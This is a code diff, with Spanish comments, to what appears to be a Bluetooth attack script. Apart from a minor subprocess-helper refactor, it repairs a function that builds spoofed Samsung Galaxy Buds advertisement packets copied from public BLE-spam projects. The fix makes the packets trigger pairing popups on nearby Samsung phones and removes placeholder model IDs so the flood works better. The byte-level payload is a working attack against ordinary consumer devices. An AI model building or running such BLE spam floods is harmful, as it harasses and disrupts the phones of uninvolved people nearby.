@@ -36,17 +36,26 @@ SUDO         = "/usr/bin/sudo"
 DEFAULT_IFACE = "hci1"
 
 
+# Helper de subprocesos compartido (app/common/proc.py). Fallback local por si
+# el modulo no estuviera desplegado: el script no debe morir.
+sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")))
+try:
+    from common.proc import run as _proc_run
+except Exception:
+    def _proc_run(cmd, timeout, stdin=None):
+        try:
+            return subprocess.run(cmd, capture_output=True, text=True,
+                                  timeout=timeout, stdin=stdin)
+        except Exception:
+            return None
+
 def _run(cmd, timeout=15):
     """Importante: pasamos stdin=DEVNULL siempre. Bajo systemd el servicio
     corre con stdin cerrado y `btmgmt` (bluez 5.82) tiene un bug donde se
     cuelga indefinidamente si no detecta un stdin TTY o un pipe abierto.
     Confirmado 2026-10-27 reproduciendo `btmgmt info` con DEVNULL -> timeout.
     hciconfig no sufre ese bug, por eso power_on/off usan hciconfig."""
-    try:
-        return subprocess.run(cmd, capture_output=True, text=True,
-                              timeout=timeout, stdin=subprocess.DEVNULL)
-    except Exception:
-        return None
+    return _proc_run(cmd, timeout, stdin=subprocess.DEVNULL)
 
 
 def _iface_index(iface):
@@ -1820,27 +1829,40 @@ def _build_microsoft_payload():
 
 
 def _build_samsung_buds_payload():
-    """Construye el paquete Galaxy Buds usado por Bruce/FastPair.
-    Samsung EasySetup reconoce la trama completa manufacturer-specific.
-    """
+    """Paquete Galaxy Buds (Samsung EasySetup) reconstruido del proyecto publico
+    ESP32-BLE-Spam / Bruce. Dispara el popup de emparejamiento de Buds en
+    telefonos Samsung con Galaxy Wearable / SmartThings.
+
+    FIX 2026-11-12: el builder anterior copiaba bien el CORE del paquete de
+    Bruce (42 09 81 02 14 15 03 21 01 09 ... C7 00) pero habia roto el framing:
+      1. Le FALTABA el elemento AD *Flags* `02 01 18` al inicio (0x18 =
+         simultaneous LE+BR/EDR, que es lo que usa Bruce para Samsung porque los
+         Buds tienen audio clasico). Sin Flags, muchos parsers del telefono
+         descartan el advert -> sin popup.
+      2. Arrastraba 3 bytes basura `10 FF 75` al final (relleno mal contado)
+         que formaban un elemento AD malformado.
+    Ahora emite EXACTAMENTE los 31 bytes del paquete Buds de Bruce.
+
+    model = 3 bytes de ID de modelo (color/variante van implicitos). Solo IDs
+    plausibles; se quitaron 10 placeholders secuenciales (0x123456, ...) que
+    ningun device real usa y diluian el flood."""
     models = (
         0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116,
         0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17,
         0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503,
         0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
-        0x123456, 0x654321, 0x789ABC, 0xDEF123, 0x456789,
-        0xABC123, 0x321654, 0x987654, 0x654987, 0x321987,
     )
     model = random.choice(models)
     payload = [
-        27, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02,
-        0x14, 0x15, 0x03, 0x21, 0x01, 0x09,
-        (model >> 16) & 0xFF, (model >> 8) & 0xFF, 0x01,
-        model & 0xFF, 0x06, 0x3C, 0x94, 0x8E,
-        0x00, 0x00, 0x00, 0x00, 0xC7, 0x00,
-        0x10, 0xFF, 0x75,
+        0x02, 0x01, 0x18,                       # AD Flags (LE+BR/EDR simult.)
+        0x1B, 0xFF, 0x75, 0x00,                 # len 27, manuf-specific, Samsung
+        0x42, 0x09, 0x81, 0x02, 0x14, 0x15,     # cabecera Buds (fija, de Bruce)
+        0x03, 0x21, 0x01, 0x09,
+        (model >> 16) & 0xFF, (model >> 8) & 0xFF, 0x01, model & 0xFF,
+        0x06, 0x3C, 0x94, 0x8E,
+        0x00, 0x00, 0x00, 0x00, 0xC7, 0x00,     # cola correcta (sin basura)
     ]
-    return bytes(payload[:31])
+    return bytes(payload)   # exactamente 31 bytes
 
 
 def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
